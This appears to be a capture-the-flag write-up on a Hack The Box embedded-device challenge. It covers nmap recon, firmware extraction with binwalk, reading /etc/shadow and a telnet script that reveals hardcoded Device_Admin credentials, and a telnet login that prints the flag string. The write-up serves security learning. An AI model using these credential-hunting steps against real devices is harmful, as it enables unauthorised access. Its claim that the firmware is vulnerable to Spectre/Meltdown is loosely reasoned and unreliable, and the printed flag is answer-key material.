# Hacking **Embedded Systems** 
## Summary
- ### Learning Outcomes:
**Decomposition**: Understanding the structural relationship between the *Firmware*, *bootloader*, *kernel* , *OS* and *Filesystem*.\
**Embedded Logic**: Identifying how custom service wrappers (like telnetd.sh) override standard Linux authentication.\
**Deeper understanding of Linux systems security**.\
**Security Assessment**: Recognizing that "Locked" accounts in `/etc/shadow` can be bypassed if the service uses a custom authentication backend.\

- ### Target:
**ARMv5** Architecture | **Linux** Kernel v4.4.50 | **OpenWrt**-based OS.
- ### Vulnerabilities:
Insecure Telnet configuration, Hardware-level Speculative Execution (Spectre/Meltdown), Hardcoded service credentials.
- ### Methods:
Static firmware decomposition, filesystem reversal, and logic analysis of boot scripts.
- ### Tools:
binwalk, firmwalk, FAT (Firmware Analysis Toolkit) and basic Linux commands.
- ### OS Architecture:
OpenWrt with SquashFS read-only root and JFFS2 writable overlay.

## Steps
1. Information gathering and reconnaissance: 

- Used nmap to detect open ports and services running on target embedded device:
```
└─$ nmap -sV -p32445 154.57.164.64
...
PORT      STATE SERVICE VERSION
32445/tcp open  telnet  BusyBox telnetd
```

2. Interacting with the system:
- I tried to gain access with ```telnet```
- But I noticed a weird behaviour:
  
```
└─$ telnet 154.57.164.64 32445 -a
Trying 154.57.164.64...
Connected to 154.57.164.64.
ng-2450945-hwtheneedle-o1g2v-8555d54c47-jrqml login: root
Login incorrect
ng-2450945-hwtheneedle-o1g2v-8555d54c47-jrqml login: randomstring
Password:
Login incorrect
```
3. Initial analysis:
  - Logging in with *root* exits immediately but when using an other user, the server asks for a password (regardless of it existing or not)
  - The reasons for this could be: root access block, root has no password (many services block root access altoogether or if they find it has no password...)
  - So I had to investigate this Telnet behaiviour, luckily the firmware was publicly available to download on the manufacturer's website. (found it quickly thanks to **google dorking**)

4. Static firmware analysis: ```firmware.bin```:
- **Basic Digging:**
```
└─$ file firmware.bin
firmware.bin: Linux kernel ARM boot executable zImage (kernel >=v3.17, <v4.15) (big-endian, BE-32, ARMv5)
```
=> This is a firmware version vulnerable to **Spectre/Meltdown vulnerabilities**: which basically utilize the speed enhancing feature in CPUs (predicting next command before reading it, if correct proceed, else remove it. But it stays in memory) allowing OS access to sensitive data in the hardware.

``` strings ``` and ``` hexdump ``` didn't yield anything useful

- **Extraction:**
I Used ``` binwalk ``` for signature/MagicByte-based Extraction:

```
└─$ binwalk -e firmware.bin
DECIMAL       HEXADECIMAL     DESCRIPTION

└─$ ls _firmware.bin.extracted/
3853.xz  3930  3930.xz  83948.squashfs  squashfs-root
```

.3930 / 3930.xz: Compressed ARM Linux Kernel (zImage).
.83948.squashfs: The compressed filesystem block.\
.squashfs-root/: The extracted OpenWrt directory structure.

**Further Analysis**: 
Inside the filesystem, `/etc/passwd` and `/etc/shadow` were my first target, and my suspecions were confirmed, no password for the `root` user (nothing in the second column of etc/shadow), so maybe that's why telnet was blocking it:
```
└─$ cat etc/passwd
root:x:0:0:root:/root:/bin/ash
...
└─$ cat etc/shadow
root::0:0:99999:7:::
```

- in parallel, I set `FirmWalk` to run on the extracted filesystem in the background, automating the search for sensitive strings (passwords, certificates) within the extracted FS. (nothing really useful came out).

So I checked the ` telnetd.sh ` script to further investigate:

```
Bash
sign=`cat /etc/config/sign`
telnetd -l "/usr/sbin/login" -u Device_Admin:$sign -i $lf &
```

And **VOILA!**, the script exposed hardcoded credentials (not detected by firmwalk): `Device_Admin:$sign` (password in the `/etc/config/sign` file)

- **Exploitation**:
Finally, I used the recovered credentials to establish a Telnet session and capture the flag:
```
└─$ telnet 154.57.164.64 32445
...
ng-2450945-hwtheneedle-o1g2v-8555d54c47-jrqml login: Device_Admin
Password:
ng-2450945-hwtheneedle-o1g2v-8555d54c47-jrqml:~$ ls
flag.txt
ng-2450945-hwtheneedle-o1g2v-8555d54c47-jrqml:~$ cat flag.txt
HTB{4_hug3_blund3r_d289a1_!!}
```
## **What's next?**

 - **Maybe I can make a tool** in the future that can detect such hardcoded credentials more intelligently. (Based on downloaded commands's inline credential settings)
 - **Privilege Escalation**: while root is restricted over Telnet, the system configuration allows for potential escalation via local exploits, such as the Spectre/Meltdown vulnerabilities.
## **Recommendations**:
- Update the system configuration version.
  Remove hardcoded credentials
  
 ## **Conclusion**:

-  We just proved that embedded security is only as strong as its weakest configuration file; obfuscating the username to Device_Admin and blocking root access, provided no protection against static analysis.
